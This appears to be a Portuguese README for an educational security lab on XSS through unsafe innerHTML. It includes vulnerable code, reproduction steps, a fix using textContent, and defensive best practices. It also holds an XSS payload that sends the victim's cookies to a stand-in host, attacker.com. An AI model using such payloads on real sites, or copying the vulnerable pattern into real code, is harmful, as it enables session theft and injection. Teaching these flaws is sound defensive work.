# 🟠 Lab 02 — innerHTML Inseguro

> **Série DevQuest Security Labs** · Nível 1 · Front-End


## Objetivo

Demonstrar como o uso de `innerHTML` com dados fornecidos pelo usuário cria uma vulnerabilidade de **XSS (Cross-Site Scripting)**, permitindo a injeção e execução de HTML e JavaScript arbitrários na página.


## A Vulnerabilidade

**Tipo:** XSS via innerHTML  
**CWE:** CWE-79

// ❌ INSEGURO — board de comentários vulnerável
container.innerHTML = comentarios.map(c => `
  <div class="comment-body">${c.msg}</div>
`).join('');

Qualquer HTML presente em `c.msg` é renderizado pelo browser.


## Como Reproduzir

1. Abra `vulnerable/index.html`
2. No campo mensagem, cole:
   <img src=x onerror="alert('XSS via innerHTML!')">
3. Clique em **POSTAR**
4. O alert dispara — o código foi executado

**Payload de roubo de dados:**
<img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)">


## Impacto

- Execução de JavaScript no contexto da vítima
- Roubo de cookies e tokens de sessão
- Keylogging e captura de formulários
- Redirecionamento malicioso


## A Correção

// ✅ SEGURO — createElement + textContent
const body = document.createElement('div');
body.textContent = c.msg; // HTML é escapado automaticamente


## Boas Práticas

- ✅ Prefira `textContent` / `createTextNode` a `innerHTML`
- ✅ Use [DOMPurify](https://github.com/cure53/DOMPurify) se HTML formatado for necessário
- ✅ Sanitize no servidor — nunca confie só no cliente
- ✅ Configure CSP para bloquear scripts inline


## 🌐 Live Demo

| Versão | Link |
| ⚠️ Vulnerável | [/vulnerable](./vulnerable/index.html) |
| ✅ Corrigida   | [/fixed](./fixed/index.html) |

*DevQuest Security Labs · Laboratório educacional*
